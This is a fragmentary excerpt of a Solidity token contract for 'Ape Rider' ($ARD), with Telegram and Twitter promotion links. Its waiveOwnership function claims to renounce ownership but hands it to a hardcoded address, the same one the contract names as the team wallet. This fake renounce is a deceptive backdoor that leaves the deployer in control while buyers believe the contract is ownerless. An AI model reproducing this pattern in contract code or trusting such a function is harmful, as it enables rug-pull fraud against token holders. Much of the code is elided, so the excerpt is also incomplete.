...
/**
Telegram : https://t.me/aperiderbuy
Website : https://twitter.com/ApeRider_Buy
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xa3cad1Fd015f68F61C17E21aDe772bae6e19918d);
    }
...
contract ApeRider is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Ape Rider";
    string private _symbol = "$ARD";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB5b84B8578AF41247a54e38369109E76cC1749CC);
    address payable private teamWalletAddress = payable(0xa3cad1Fd015f68F61C17E21aDe772bae6e19918d);
